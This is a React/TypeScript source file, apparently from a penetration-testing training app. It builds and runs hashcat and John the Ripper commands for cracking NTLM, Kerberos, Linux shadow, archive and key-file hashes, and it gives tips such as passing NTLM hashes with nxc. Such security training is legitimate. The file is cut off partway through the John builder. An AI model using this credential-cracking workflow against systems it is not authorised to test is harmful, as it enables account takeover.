import { useEffect, useState, useSyncExternalStore, type ReactNode } from "react";
import { Copy } from "lucide-react";
import { VenomBuilder } from "@/components/venom-builder";
import { HashIdentifier } from "@/components/hash-identifier";
import { LocalMatch } from "@/components/local-match";
import { HydraRun, ToolRun } from "@/components/hydra-run";
import { UdpScan } from "@/components/udp-scan";
import { NmapScan } from "@/components/nmap-scan";
import { SearchsploitRun } from "@/components/searchsploit-run";
import { TunnelBuilder } from "@/components/tunnel-builder";
import { ImpacketBuilder } from "@/components/impacket-builder";
import { WfuzzBuilder } from "@/components/wfuzz-builder";
import { LootPick } from "@/components/loot-card";
import { getLoot, getLootServer, lootLines, LOOT_HASHCAT, subscribeLoot, type LootKind } from "@/lib/loot";
import { quoteHydraArg } from "@/lib/hydra-args";

export type ToolId = "msfvenom" | "identify" | "hashcat" | "john" | "hydra" | "nxc" | "local" | "udp" | "tunnel" | "wfuzz" | "impacket";

const LABELS: Record<ToolId, string> = {
  msfvenom: "msfvenom",
  identify: "identify",
  hashcat: "hashcat",
  john: "john",
  hydra: "hydra",
  nxc: "nxc",
  local: "local",
  udp: "udp",
  tunnel: "tunnel",
  wfuzz: "wfuzz",
  impacket: "impacket",
};

function Field({ label, children }: { label: string; children: ReactNode }) {
  return (
    <label className="flex min-w-0 flex-col gap-1 text-sm">
      <span className="font-mono text-xs tracking-wide text-muted">{label}</span>
      {children}
    </label>
  );
}

const control =
  "min-h-11 w-full rounded-lg border border-border bg-bg px-3 text-sm text-fg outline-none";

function bashSingle(value: string) {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

function cleanTarget(value: string) {
  const v = value.trim();
  if (!/^[A-Za-z0-9_.:/-]+$/.test(v)) return "";
  if (v.includes("..")) return "";
  return v;
}

function cleanUser(value: string) {
  const v = value.trim();
  if (!/^[A-Za-z0-9_./\\@+-]+$/.test(v)) return "";
  if (v.includes("..")) return "";
  return v;
}

function cleanPath(value: string) {
  const v = value.trim();
  if (!/^[A-Za-z0-9_./+-]+$/.test(v)) return "";
  if (v.includes("..")) return "";
  return v;
}

function cleanLoose(value: string) {
  return value.replace(/[\n\r]/g, "").trim();
}

function digits(value: string, max: number) {
  if (!/^\d+$/.test(value.trim())) return "";
  const n = Number(value);
  return n >= 1 && n <= max ? String(n) : "";
}

function outfileSafe(value: string) {
  const v = value.trim();
  return /^[A-Za-z0-9._-]{1,64}$/.test(v) ? v : "";
}

const HASHCAT_RULES = [
  { id: "", label: "No rule file" },
  { id: "best64", label: "best64" },
  { id: "dive", label: "dive" },
  { id: "toggles1", label: "toggles1" },
  { id: "leetspeak", label: "leetspeak" },
  { id: "d3ad0ne", label: "d3ad0ne" },
  { id: "rockyou-30000", label: "rockyou-30000" },
  { id: "Incisive-leetspeak", label: "Incisive-leetspeak" },
];

function hashcatFlagWhy(flags: {
  workload: string;
  optimized: boolean;
  forceOpencl: boolean;
  hwmon: boolean;
  status: boolean;
  potOff: boolean;
  removeFound: boolean;
  increment: boolean;
}) {
  const bits = [
    flags.workload ? ` -w ${flags.workload} is the workload. 1 is gentle, 4 can make the VM unusable.` : "",
    flags.optimized ? " -O is the optimised kernel. It is faster and it will not try long passwords." : "",
    flags.forceOpencl ? " --force runs when hashcat refuses the driver. That is normal in a VM." : "",
    flags.hwmon ? " --hwmon-disable skips the fan check a VM does not have." : "",
    flags.status ? " --status prints progress every 10 seconds." : "",
    flags.potOff ? " --potfile-disable does not save or reuse a previous crack." : "",
    flags.removeFound ? " --remove deletes a line from the hash file once it cracks." : "",
    flags.increment ? " --increment tries the mask from the shorter lengths up." : "",
  ];
  return bits.join("");
}

function CopyBlock({
  command,
  empty,
}: {
  command: string;
  empty: string;
}) {
  const [copied, setCopied] = useState(false);
  async function copyCmd() {
    if (!command) return;
    try {
      await navigator.clipboard.writeText(command);
      setCopied(true);
      window.setTimeout(() => setCopied(false), 1200);
    } catch {
      setCopied(false);
    }
  }
  return (
    <div>
      <div className="mb-2 flex items-center justify-between">
        <p className="font-mono text-xs tracking-wide text-muted">COMMAND</p>
        <button
          type="button"
          onClick={copyCmd}
          disabled={!command}
          className="inline-flex min-h-11 items-center gap-1 rounded-lg px-2 text-xs text-muted hover:text-fg disabled:opacity-40"
        >
          <Copy className="size-3.5" aria-hidden="true" />
          {copied ? "Copied" : "Copy"}
        </button>
      </div>
      <pre className="max-w-full overflow-x-auto whitespace-pre-wrap break-words rounded-lg bg-bg p-3 font-mono text-xs leading-relaxed text-fg">
        {command || empty}
      </pre>
    </div>
  );
}

function Shell({
  title,
  blurb,
  children,
  command,
  empty,
  why,
  note,
  stop,
  then,
  footer,
}: {
  title: string;
  blurb: string;
  children: ReactNode;
  command: string;
  empty: string;
  why: string;
  note: string;
  stop?: boolean;
  then?: string;
  footer?: ReactNode;
}) {
  return (
    <article className="min-w-0 overflow-hidden rounded-lg border border-primary bg-surface">
      <div className="border-b border-border px-4 py-3">
        <p className="font-mono text-xs text-primary">Builder</p>
        <h2 className="text-lg font-semibold">{title}</h2>
        <p className="mt-1 text-sm text-muted">{blurb}</p>
      </div>
      <div className="grid gap-3 px-4 py-4 sm:grid-cols-2">{children}</div>
      <div className="flex flex-col gap-3 px-4 pb-4">
        <CopyBlock command={command} empty={empty} />
        {footer}
        <div>
          <p className="font-mono text-xs tracking-wide text-primary">WHAT IT DOES</p>
          <p className="mt-1 whitespace-pre-wrap text-sm text-fg">{why}</p>
          <p className={"mt-2 text-sm " + (stop ? "text-dead" : "text-muted")}>{note}</p>
        </div>
        {then ? (
          <div>
            <p className="font-mono text-xs tracking-wide text-muted">THEN</p>
            <pre className="mt-2 whitespace-pre-wrap break-words rounded-lg bg-bg p-3 font-mono text-xs text-fg">
              {then}
            </pre>
          </div>
        ) : null}
      </div>
    </article>
  );
}

const HASH_MODES: { id: string; label: string; file: string; hint: string; note: string }[] = [
  {
    id: "1000",
    label: "1000 NTLM",
    file: "ntlm.txt",
    hint: "32 hex characters, nothing else on the line",
    note: "If this is a domain account, pass it with nxc -H before you spend the hour cracking it.",
  },
  {
    id: "3000",
    label: "3000 LM",
    file: "lm.txt",
    hint: "32 hex. Often ends in aad3b435b51404ee, which is an empty half.",
    note: "LM is weak. If the second half is the empty value, you only have seven characters.",
  },
  {
    id: "5600",
    label: "5600 NetNTLMv2",
    file: "netntlmv2.txt",
    hint: "user::DOMAIN:challenge:HMAC:blob",
    note: "This is a captured challenge, not an NT hash. You cannot pass it with -H.",
  },
  {
    id: "5500",
    label: "5500 NetNTLMv1",
    file: "netntlmv1.txt",
    hint: "user::DOMAIN:LMresp:NTresp",
    note: "Same idea as v2. Crack it or relay it is not allowed on the exam, so crack it or move on.",
  },
  {
    id: "13100",
    label: "13100 Kerberos TGS etype 23",
    file: "kerb.txt",
    hint: "$krb5tgs$23$*user$REALM$spn*$...",
    note: "RC4 tickets. If the line says $krb5tgs$17$ or $18$, pick the AES mode instead.",
  },
  {
    id: "19600",
    label: "19600 Kerberos TGS AES128",
    file: "kerb.txt",
    hint: "$krb5tgs$17$*user$REALM$spn*$...",
    note: "AES is slow. One pass of rockyou, then stop.",
  },
  {
    id: "19700",
    label: "19700 Kerberos TGS AES256",
    file: "kerb.txt",
    hint: "$krb5tgs$18$*user$REALM$spn*$...",
    note: "AES is slow. One pass of rockyou, then stop.",
  },
  {
    id: "18200",
    label: "18200 AS-REP etype 23",
    file: "asrep.txt",
    hint: "$krb5asrep$23$user@REALM:checksum$edata",
    note: "Only etype 23. If the hash says $krb5asrep$18$, this mode will reject the line.",
  },
  {
    id: "3200",
    label: "3200 bcrypt",
    file: "bcrypt.txt",
    hint: "$2a$, $2b$, or $2y$",
    note: "bcrypt is slow. If rockyou does not crack it quickly, the password is not a lab password. Stop.",
  },
  {
    id: "1800",
    label: "1800 sha512crypt",
    file: "sha512.txt",
    hint: "$6$...",
    note: "Linux SHA-512. John cracks the same hash if you would rather stay in one tool.",
  },
  {
    id: "500",
    label: "500 md5crypt",
    file: "md5crypt.txt",
    hint: "$1$...",
    note: "Older Linux and some appliances.",
  },
  {
    id: "7400",
    label: "7400 sha256crypt",
    file: "sha256.txt",
    hint: "$5$...",
    note: "Linux SHA-256.",
  },
  {
    id: "1600",
    label: "1600 Apache MD5",
    file: "apr1.txt",
    hint: "$apr1$...",
    note: "htpasswd and some web apps.",
  },
  {
    id: "0",
    label: "0 MD5",
    file: "md5.txt",
    hint: "32 hex, no prefix",
    note: "Unsalted MD5. If hashid is unsure, do not guess a second mode in the same file.",
  },
  {
    id: "100",
    label: "100 SHA1",
    file: "sha1.txt",
    hint: "40 hex",
    note: "Unsalted SHA1.",
  },
  {
    id: "1400",
    label: "1400 SHA256",
    file: "sha256.txt",
    hint: "64 hex",
    note: "Unsalted SHA256. Not the same as $5$.",
  },
  {
    id: "1700",
    label: "1700 SHA512",
    file: "sha512.txt",
    hint: "128 hex",
    note: "Unsalted SHA512. Not the same as $6$.",
  },
  {
    id: "300",
    label: "300 MySQL 4.1 / 5",
    file: "mysql.txt",
    hint: "* followed by 40 hex",
    note: "The star is part of the hash. Keep it.",
  },
  {
    id: "131",
    label: "131 MSSQL 2000",
    file: "mssql.txt",
    hint: "0x0100 and a short hex blob",
    note: "Old SQL Server.",
  },
  {
    id: "132",
    label: "132 MSSQL 2005",
    file: "mssql.txt",
    hint: "0x0100 and a longer hex blob",
    note: "Includes the salt. Paste the whole 0x string.",
  },
  {
    id: "1731",
    label: "1731 MSSQL 2012",
    file: "mssql.txt",
    hint: "0x0200...",
    note: "2012 and later.",
  },
  {
    id: "17200",
    label: "17200 PKZIP",
    file: "zip.hash",
    hint: "$pkzip$... from zip2john",
    note: "Run the john builder's zip conversion first, then point hashcat at that file.",
  },
  {
    id: "13600",
    label: "13600 WinZip",
    file: "zip.hash",
    hint: "$zip2$... from zip2john",
    note: "WinZip AES. John can crack the same file if you would rather not switch tools.",
  },
  {
    id: "9400",
    label: "9400 Office 2007",
    file: "office.hash",
    hint: "$office$*2007*... from office2john",
    note: "Use the year office2john prints. 2007 is 9400, 2010 is 9500, 2013 is 9600.",
  },
  {
    id: "9500",
    label: "9500 Office 2010",
    file: "office.hash",
    hint: "$office$*2010*...",
    note: "2010 only. A 2013 document will not crack in this mode.",
  },
  {
    id: "9600",
    label: "9600 Office 2013",
    file: "office.hash",
    hint: "$office$*2013*...",
    note: "2013 is slow. One rockyou pass, then stop.",
  },
  {
    id: "13400",
    label: "13400 KeePass",
    file: "keepass.hash",
    hint: "$keepass$... from keepass2john",
    note: "John is usually simpler for a kdbx. Same wordlist either way.",
  },
];

function HashcatBuilder() {
  const [mode, setMode] = useState("1000");
  const [source, setSource] = useState<"file" | "paste" | "loot">("file");
  const [file, setFile] = useState("ntlm.txt");
  const [pasted, setPasted] = useState("");
  const [attack, setAttack] = useState<"wordlist" | "rules" | "mask" | "show">("wordlist");
  const [list, setList] = useState("/usr/share/wordlists/rockyou.txt");
  const [customList, setCustomList] = useState("");
  const [mask, setMask] = useState("?u?l?l?l?l?d?d?d?d");
  const [username, setUsername] = useState(false);
  const [extraArgs, setExtraArgs] = useState<string[]>([]);
  const [workload, setWorkload] = useState("");
  const [ruleName, setRuleName] = useState("");
  const [optimized, setOptimized] = useState(false);
  const [forceOpencl, setForceOpencl] = useState(false);
  const [hwmon, setHwmon] = useState(false);
  const [status, setStatus] = useState(false);
  const [potOff, setPotOff] = useState(false);
  const [removeFound, setRemoveFound] = useState(false);
  const [outfile, setOutfile] = useState("");
  const [session, setSession] = useState("");
  const [increment, setIncrement] = useState(false);
  const [incMin, setIncMin] = useState("");
  const [incMax, setIncMax] = useState("");
  const [charset, setCharset] = useState("");

  const picked = HASH_MODES.find((m) => m.id === mode) ?? HASH_MODES[0];
  const saved = useSyncExternalStore(subscribeLoot, getLoot, getLootServer);
  const lootKind = (Object.entries(LOOT_HASHCAT).find(([, id]) => id === mode)?.[0] ?? "") as LootKind | "";
  const savedHashes = lootKind ? [...new Set(saved.filter((item) => item.kind === lootKind && item.secret).map((item) => item.secret))] : [];
  const wordlist = list === "custom" ? cleanPath(customList) : list;
  const hashFile = source === "file" ? cleanPath(file) : picked.file;
  const hash = cleanLoose(pasted).replace(/\s+/g, "");
  const hashOk = source === "loot" ? savedHashes.length > 0 : source === "file" || (hash.length > 0 && !/['"\\;&|`]/.test(hash));
  const maskOk = attack !== "mask" || /^\?[ludsab](?:\?[ludsab]|[A-Za-z0-9!@#$%&*._-]|\?l|\?u|\?d|\?s|\?a|\?b){0,30}$/.test(mask) || /^[\?ludsabA-Za-z0-9!@#$%&*._-]+$/.test(mask);
  const ready = Boolean(hashFile) && hashOk && (attack === "show" || attack === "mask" || Boolean(wordlist)) && (attack !== "mask" || (mask.length > 0 && maskOk));

  let command = "";
  const hashcatSteps: Array<
    { kind: "write"; name: string; text: string } | { kind: "exec"; bin: string; args: string[] }
  > = [];
  const hashcatQuick: Array<
    { kind: "write"; name: string; text: string } | { kind: "exec"; bin: string; args: string[] }
  > = [];
  if (ready) {
    const lines: string[] = [];
    if (source === "paste") {
      lines.push(`printf '%s\\n' ${bashSingle(hash)} > ${picked.file}`);
      hashcatSteps.push({ kind: "write", name: picked.file, text: `${hash}\n` });
    } else if (source === "loot") {
      lines.push(`# ${savedHashes.length} saved ${picked.label} hashes`);
      hashcatSteps.push({ kind: "write", name: picked.file, text: `${savedHashes.join("\n")}\n` });
    }
    const crack = ["-m", picked.id];
    if (username) crack.push("--username");
    if (workload === "1" || workload === "2" || workload === "3" || workload === "4") crack.push("-w", workload);
    else if (attack === "rules") crack.push("-w", "3");
    if (optimized) crack.push("-O");
    if (forceOpencl) crack.push("--force");
    if (hwmon) crack.push("--hwmon-disable");
    if (status) crack.push("--status", "--status-timer", "10");
    if (potOff) crack.push("--potfile-disable");
    if (removeFound) crack.push("--remove");
    const out = cleanPath(outfile);
    if (out) crack.push("-o", out);
    const sess = outfileSafe(session);
    if (sess) crack.push(`--session=${sess}`);
    if (attack === "show") crack.push(hashFile, "--show");
    else if (attack === "mask") {
      crack.push("-a", "3");
      if (increment) {
        crack.push("--increment");
        const min = digits(incMin, 15);
        const max = digits(incMax, 15);
        if (min) crack.push("--increment-min", min);
        if (max) crack.push("--increment-max", max);
      }
      const set = charset.trim();
      if (/^[A-Za-z0-9?._@-]{1,64}$/.test(set)) crack.push("-1", set);
      crack.push(hashFile, mask);
    } else {
      const rule = attack === "rules" ? ruleName || "best64" : ruleName;
      if (rule && HASHCAT_RULES.some((item) => item.id === rule)) crack.push("-r", `/usr/share/hashcat/rules/${rule}.rule`);
      crack.push(hashFile, wordlist);
    }
    lines.push(["hashcat", ...crack.map(quoteHydraArg), ...extraArgs.map(quoteHydraArg)].join(" "));
    hashcatSteps.push({ kind: "exec", bin: "hashcat", args: crack });
    if (attack !== "show") {
      const show = ["-m", picked.id];
      if (username) show.push("--username");
      show.push(hashFile, "--show");
      lines.push(["hashcat", ...show.map(quoteHydraArg)].join(" "));
      hashcatSteps.push({ kind: "exec", bin: "hashcat", args: show });
    }
    command = lines.join("\n");
    if (source === "paste") hashcatQuick.push({ kind: "write", name: picked.file, text: `${hash}\n` });
    if (source === "loot") hashcatQuick.push({ kind: "write", name: picked.file, text: `${savedHashes.join("\n")}\n` });
    const quickCrack = ["-m", picked.id];
    if (username) quickCrack.push("--username");
    if (attack === "show") quickCrack.push(hashFile, "--show");
    else if (attack === "mask") quickCrack.push("-a", "3", hashFile, mask);
    else quickCrack.push(hashFile, wordlist);
    hashcatQuick.push({ kind: "exec", bin: "hashcat", args: quickCrack });
    if (attack !== "show") {
      const show = ["-m", picked.id];
      if (username) show.push("--username");
      show.push(hashFile, "--show");
      hashcatQuick.push({ kind: "exec", bin: "hashcat", args: show });
    }
  }

  const why =
    attack === "show"
      ? `-m ${picked.id} is ${picked.label}. --show reads the potfile and prints anything already cracked. It does not try new guesses.`
      : attack === "mask"
        ? `-m ${picked.id} selects the type. -a 3 is a mask attack: hashcat builds the guesses from the pattern instead of a wordlist. ?l is a lowercase letter, ?u uppercase, ?d a digit, ?s a symbol, ?a any of those. This is one pattern, not a marathon.`
        : `-m ${picked.id} is ${picked.label}. The next file is one hash per line. ${attack === "rules" ? "-w 3 raises the workload. -r best64 mutates each word (capital letter, a digit, and so on). " : ""}The last path is the wordlist. The second command, --show, prints the password after a crack.`;

  return (
    <Shell
      title="hashcat"
      blurb="Pick the mode from the prefix. Paste one hash or name the file. Rockyou first. One rules pass only if that misses."
      command={command}
      empty="Choose a mode. The command appears when the file name is valid."
      why={why + (username ? " --username tells hashcat the line is name:hash and the name is not part of the hash." : "") + hashcatFlagWhy({ workload, optimized, forceOpencl, hwmon, status, potOff, removeFound, increment })}
      note={`${picked.hint}. ${picked.note}`}
      then={attack === "show" ? undefined : "Cracked means copy the password and try it. Exhausted means it is not in that list. Stop."}
      footer={
        <ToolRun
          endpoint="/api/run"
          tool="hashcat"
          disabled={!ready}
          placeholder="--status"
          onFlags={setExtraArgs}
          buildBody={(extra) => ({
            steps: hashcatSteps.map((step, index) =>
              step.kind === "exec" && index === hashcatSteps.findIndex((item) => item.kind === "exec")
                ? { ...step, args: [...step.args, ...extra] }
                : step,
            ),
          })}
          buildQuick={() => ({ steps: hashcatQuick })}
          quickHint="Quick run is -m, the hash, and the wordlist, then --show. A mask attack stays a mask. Rules, -O, and --force stay off."
        />
      }
    >
      <Field label="Mode">
        <select
          className={control}
          value={mode}
          onChange={(e) => {
            const next = HASH_MODES.find((m) => m.id === e.target.value) ?? HASH_MODES[0];
            setMode(next.id);
            if (source === "file") setFile(next.file);
          }}
        >
          {HASH_MODES.map((m) => (
            <option key={m.id} value={m.id}>
              {m.label}
            </option>
          ))}
        </select>
      </Field>
      <Field label="Attack">
        <select className={control} value={attack} onChange={(e) => setAttack(e.target.value as typeof attack)}>
          <option value="wordlist">Wordlist</option>
          <option value="rules">Wordlist plus a rule file</option>
          <option value="mask">One mask</option>
          <option value="show">Show what is already cracked</option>
        </select>
      </Field>
      <Field label="Hash source">
        <select className={control} value={source} onChange={(e) => setSource(e.target.value as typeof source)}>
          <option value="file">A file on Kali</option>
          <option value="paste">Paste one hash</option>
          <option value="loot">All saved of this type ({savedHashes.length})</option>
        </select>
      </Field>
      {source === "file" ? (
        <Field label="Hash file">
          <input className={control} value={file} onChange={(e) => setFile(e.target.value)} />
        </Field>
      ) : source === "paste" ? (
        <Field label="Hash">
          <input className={control} value={pasted} onChange={(e) => setPasted(e.target.value)} placeholder={picked.hint} />
        </Field>
      ) : (
        <p className="text-sm text-muted sm:col-span-2">
          {savedHashes.length ? `${savedHashes.length} saved hashes of this type are written to ${picked.file} when you run.` : "Nothing of this type is saved in loot yet."}
        </p>
      )}
      <LootPick
        kinds={Object.keys(LOOT_HASHCAT) as LootKind[]}
        onPick={(item) => {
          const modeId = LOOT_HASHCAT[item.kind];
          if (!modeId) return;
          setSource("paste");
          setPasted(item.secret);
          setMode(modeId);
        }}
      />
      {attack === "wordlist" || attack === "rules" ? (
        <Field label="Wordlist">
          <select className={control} value={list} onChange={(e) => setList(e.target.value)}>
            <option value="/usr/share/wordlists/rockyou.txt">rockyou</option>
            <option value="found.txt">found.txt (passwords you already have)</option>
            <option value="custom">Other path</option>
          </select>
        </Field>
      ) : null}
      {list === "custom" && (attack === "wordlist" || attack === "rules") ? (
        <Field label="Wordlist path">
          <input className={control} value={customList} onChange={(e) => setCustomList(e.target.value)} placeholder="/usr/share/wordlists/fasttrack.txt" />
        </Field>
      ) : null}
      {attack === "mask" ? (
        <Field label="Mask">
          <input className={control} value={mask} onChange={(e) => setMask(e.target.value)} />
        </Field>
      ) : null}
      <Field label="Line has a username">
        <select className={control} value={username ? "yes" : "no"} onChange={(e) => setUsername(e.target.value === "yes")}>
          <option value="no">No. The line is only the hash</option>
          <option value="yes">Yes. name:hash, add --username</option>
        </select>
      </Field>
      <Field label="Workload -w">
        <select className={control} value={workload} onChange={(e) => setWorkload(e.target.value)}>
          <option value="">Default</option>
          <option value="1">1, low</option>
          <option value="2">2</option>
          <option value="3">3, high</option>
          <option value="4">4, nightmare</option>
        </select>
      </Field>
      {attack === "wordlist" || attack === "rules" ? (
        <Field label="Rule file -r">
          <select className={control} value={attack === "rules" ? ruleName || "best64" : ruleName} onChange={(e) => setRuleName(e.target.value)}>
            {HASHCAT_RULES.map((rule) => (
              <option key={rule.id || "none"} value={rule.id}>
                {rule.label}
              </option>
            ))}
          </select>
        </Field>
      ) : null}
      {attack === "mask" ? (
        <Field label="Custom charset -1">
          <input className={control} value={charset} onChange={(e) => setCharset(e.target.value)} placeholder="?l?d" />
        </Field>
      ) : null}
      {attack === "mask" ? (
        <Field label="Increment">
          <select className={control} value={increment ? "yes" : "no"} onChange={(e) => setIncrement(e.target.value === "yes")}>
            <option value="no">No. The mask length is fixed</option>
            <option value="yes">Yes. Try shorter masks up to this one</option>
          </select>
        </Field>
      ) : null}
      {attack === "mask" && increment ? (
        <Field label="Increment min / max">
          <input className={control} value={incMin} onChange={(e) => setIncMin(e.target.value)} placeholder="1" />
        </Field>
      ) : null}
      {attack === "mask" && increment ? (
        <Field label="Increment max">
          <input className={control} value={incMax} onChange={(e) => setIncMax(e.target.value)} placeholder="8" />
        </Field>
      ) : null}
      <Field label="Optimised kernel -O">
        <select className={control} value={optimized ? "yes" : "no"} onChange={(e) => setOptimized(e.target.value === "yes")}>
          <option value="no">No</option>
          <option value="yes">Yes. Faster, shorter passwords only</option>
        </select>
      </Field>
      <Field label="VM driver --force">
        <select className={control} value={forceOpencl ? "yes" : "no"} onChange={(e) => setForceOpencl(e.target.value === "yes")}>
          <option value="no">No</option>
          <option value="yes">Yes. Hashcat refused the OpenCL driver</option>
        </select>
      </Field>
      <Field label="Fans --hwmon-disable">
        <select className={control} value={hwmon ? "yes" : "no"} onChange={(e) => setHwmon(e.target.value === "yes")}>
          <option value="no">Watch the device</option>
          <option value="yes">Disable. A VM with no fan sensor</option>
        </select>
      </Field>
      <Field label="Status line">
        <select className={control} value={status ? "yes" : "no"} onChange={(e) => setStatus(e.target.value === "yes")}>
          <option value="no">Quiet until it finishes</option>
          <option value="yes">--status every 10 seconds</option>
        </select>
      </Field>
      <Field label="Potfile">
        <select className={control} value={potOff ? "yes" : "no"} onChange={(e) => setPotOff(e.target.value === "yes")}>
          <option value="no">Use the potfile</option>
          <option value="yes">--potfile-disable. Do not remember cracks</option>
        </select>
      </Field>
      <Field label="Remove cracked --remove">
        <select className={control} value={removeFound ? "yes" : "no"} onChange={(e) => setRemoveFound(e.target.value === "yes")}>
          <option value="no">Leave the hash file alone</option>
          <option value="yes">Delete cracked lines from the hash file</option>
        </select>
      </Field>
      <Field label="Output file -o">
        <input className={control} value={outfile} onChange={(e) => setOutfile(e.target.value)} placeholder="cracked.txt" />
      </Field>
      <Field label="Session">
        <input className={control} value={session} onChange={(e) => setSession(e.target.value)} placeholder="box1" />
      </Field>
    </Shell>
  );
}

type JohnJob = {
  id: string;
  label: string;
  fields: { key: string; label: string; initial: string }[];
  convert: (files: Record<string, string>) => string;
  hashName: string;
  note: string;
};

const JOHN_JOBS: JohnJob[] = [
  {
    id: "hash",
    label: "Hash file John already understands",
    fields: [{ key: "hash", label: "Hash file", initial: "hashes.txt" }],
    convert: () => "",
    hashName: "hashes.txt",
    note: "No password hashes loaded means the line is still the raw file, or the hash field is x.",
  },
  {
    id: "ssh",
    label: "SSH private key",
    fields: [{ key: "key", label: "Key file", initial: "id_rsa" }],
    convert: (f) => `ssh2john ${f.key} > key.hash`,
    hashName: "key.hash",
    note: "If ssh -i connects with no prompt, the key has no passphrase. Do not run john.",
  },
  {
    id: "unshadow",
    label: "Linux passwd and shadow",
    fields: [
      { key: "passwd", label: "passwd file", initial: "passwd" },
      { key: "shadow", label: "shadow file", initial: "shadow" },
    ],
    convert: (f) => `unshadow ${f.passwd} ${f.shadow} > unshadowed.txt`,
    hashName: "unshadowed.txt",
    note: "$y$ is yescrypt. John is the easier cracker for that. $6$ is sha512crypt. Both go through unshadow.",
  },
  {
    id: "zip",
    label: "ZIP",
    fields: [{ key: "file", label: "ZIP file", initial: "secret.zip" }],
    convert: (f) => `zip2john ${f.file} > zip.hash`,
    hashName: "zip.hash",
    note: "John cracks the converted file. You do not point john at the zip itself.",
  },
  {
    id: "rar",
    label: "RAR",
    fields: [{ key: "file", label: "RAR file", initial: "secret.rar" }],
    convert: (f) => `rar2john ${f.file} > rar.hash`,
    hashName: "rar.hash",
    note: "Same pattern as zip. Crack rar.hash, not the archive.",
  },
  {
    id: "7z",
    label: "7z",
    fields: [{ key: "file", label: "7z file", initial: "secret.7z" }],
    convert: (f) => `7z2john ${f.file} > 7z.hash`,
    hashName: "7z.hash",
    note: "If 7z2john is not on PATH, it lives under /usr/share/john/.",
  },
  {
    id: "keepass",
    label: "KeePass",
    fields: [{ key: "file", label: "kdbx file", initial: "db.kdbx" }],
    convert: (f) => `keepass2john ${f.file} > keepass.hash`,
    hashName: "keepass.hash",
    note: "A kdbx with a long random password will exhaust rockyou. One pass.",
  },
  {
    id: "office",
    label: "Office document",
    fields: [{ key: "file", label: "Document", initial: "secret.docx" }],
    convert: (f) => `office2john ${f.file} > office.hash`,
    hashName: "office.hash",
    note: "office2john prints the version. That version picks a hashcat mode if you switch tools.",
  },
  {
    id: "pdf",
    label: "PDF",
    fields: [{ key: "file", label: "PDF", initial: "secret.pdf" }],
    convert: (f) => `pdf2john ${f.file} > pdf.hash`,
    hashName: "pdf.hash",
    note: "If pdf2john is missing, use pdf2john.pl from /usr/share/john/.",
  },
  {
    id: "pfx",
    label: "PFX / PKCS12",
    fields: [{ key: "file", label: "PFX", initial: "user.pfx" }],
    convert: (f) => `pfx2john ${f.file} > pfx.hash`,
    hashName: "pfx.hash",
    note: "This is the file password, not the AD password, until you try the result.",
  },
  {
    id: "putty",
    label: "PuTTY private key",
    fields: [{ key: "file", label: "PPK", initial: "id.ppk" }],
    convert: (f) => `putty2john ${f.file} > putty.hash`,
    hashName: "putty.hash",
    note: "Same idea as ssh2john. The passphrase unlocks the key.",
  },
];

const JOHN_FORMATS = [
  { id: "", label: "Let John decide" },
  { id: "NT", label: "NT (NTLM)" },
  { id: "netntlmv2", label: "netntlmv2" },
  { id: "krb5tgs", label: "krb5tgs" },
  { id: "krb5asrep", label: "krb5asrep" },
  { id: "bcrypt", label: "bcrypt" },
  { id: "sha512crypt", label: "sha512crypt ($6$)" },
  { id: "yescrypt", label: "yescrypt ($y$)" },
  { id: "md5crypt", label: "md5crypt ($1$)" },
  { id: "sha256crypt", label: "sha256crypt ($5$)" },
];

function JohnBuilder() {
  const [jobId, setJobId] = useState("ssh");
  const [files, setFiles] = useState<Record<string, string>>({ key: "id_rsa" });
  const [attack, setAttack] = useState<"wordlist" | "single" | "incremental" | "show">("wordlist");
  const [list, setList] = useState("/usr/share/wordlists/rockyou.txt");
  const [customList, setCustomList] = useState("");
  const [format, setFormat] = useState("");
  const [extraArgs, setExtraArgs] = useState<string[]>([]);
  const [johnRules, setJohnRules] = useState("");
  const [fork, setFork] = useState("1");
  const [maxLen, setMaxLen] = useState("");
  const [johnUsers, setJohnUsers] = useState("");
  const [pot, setPot] = useState("");
  const [johnSession, setJohnSession] = useState("");
  const [incremental, setIncremental] = useState("ASCII");
  const [johnMask, setJohnMask] = useState("");

  const job = JOHN_JOBS.find((j) => j.id === jobId) ?? JOHN_JOBS[0];
  const wordlist = list === "custom" ? cleanPath(customList) : list;
  const readyFiles = job.fields.every((field) => cleanPath(files[field.key] || ""));
  const ready = readyFiles && (attack === "show" || attack === "single" || attack === "incremental" || Boolean(wordlist));

  let command = "";
  const johnSteps: Array<
    | { kind: "exec"; bin: string; args: string[] }
    | { kind: "exec-to-file"; bin: string; args: string[]; name: string }
  > = [];
  const johnQuick: Array<
    | { kind: "exec"; bin: string; args: string[] }
    | { kind: "exec-to-file"; bin: string; args: string[]; name: string }
  > = [];
  if (ready) {
    const named: Record<string, string> = {};
    for (const field of job.fields) named[field.key] = cleanPath(files[field.key] || "");
    const target = job.id === "hash" ? named.hash : job.hashName;
    const convert = job.convert(named);
    if (job.id === "ssh") johnSteps.push({ kind: "exec-to-file", bin: "ssh2john", args: [named.key], name: job.hashName });
    if (job.id === "unshadow") johnSteps.push({ kind: "exec-to-file", bin: "unshadow", args: [named.passwd, named.shadow], name: job.hashName });
    if (job.id === "zip") johnSteps.push({ kind: "exec-to-file", bin: "zip2john", args: [named.file], name: job.hashName });
    if (job.id === "rar") johnSteps.push({ kind: "exec-to-file", bin: "rar2john", args: [named.file], name: job.hashName });
    if (job.id === "7z") johnSteps.push({ kind: "exec-to-file", bin: "7z2john", args: [named.file], name: job.hashName });
    if (job.id === "keepass") johnSteps.push({ kind: "exec-to-file", bin: "keepass2john", args: [named.file], name: job.hashName });
    if (job.id === "office") johnSteps.push({ kind: "exec-to-file", bin: "office2john", args: [named.file], name: job.hashName });
    if (job.id === "pdf") johnSteps.push({ kind: "exec-to-file", bin: "pdf2john", args: [named.file], name: job.hashName });
    if (job.id === "pfx") johnSteps.push({ kind: "exec-to-file", bin: "pfx2john", args: [named.file], name: job.hashName });
    if (job.id === "putty") johnSteps.push({ kind: "exec-to-file", bin: "putty2john", args: [named.file], name: job.hashName });
    const crack: string[] = [];
    if (format) crack.push(`--format=${format}`);
    if (fork === "2" || fork === "4") crack.push(`--fork=${fork}`);
    const length = digits(maxLen, 32);
    if (length) crack.push(`--max-length=${length}`);
    const users = /^[A-Za-z0-9._,-]{1,80}$/.test(johnUsers.trim()) ? johnUsers.trim() : "";
    if (users) crack.push(`--users=${users}`);
    const potFile = cleanPath(pot);
    if (potFile) crack.push(`--pot=${potFile}`);
    const sess = outfileSafe(johnSession);
    if (sess) crack.push(`--session=${sess}`);
